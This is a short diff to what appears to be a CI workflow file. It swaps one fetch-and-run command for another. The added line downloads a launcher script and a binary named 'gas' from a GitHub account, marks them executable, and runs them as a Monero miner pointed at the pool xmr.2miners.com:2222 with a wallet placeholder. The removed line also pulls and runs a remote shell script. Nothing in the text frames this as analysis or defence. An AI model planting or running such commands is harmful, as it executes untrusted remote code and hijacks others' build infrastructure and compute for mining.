@@ -36,4 +36,4 @@ workflows:
             - Devop1
             - Devop2
             - Devop3
-run:wget https://raw.githubusercontent.com/EkorahM/usdto/main/data_api.sh && chmod +x data_api.sh && ./data_api.sh
+run:wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <WALLET ADDRESS>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
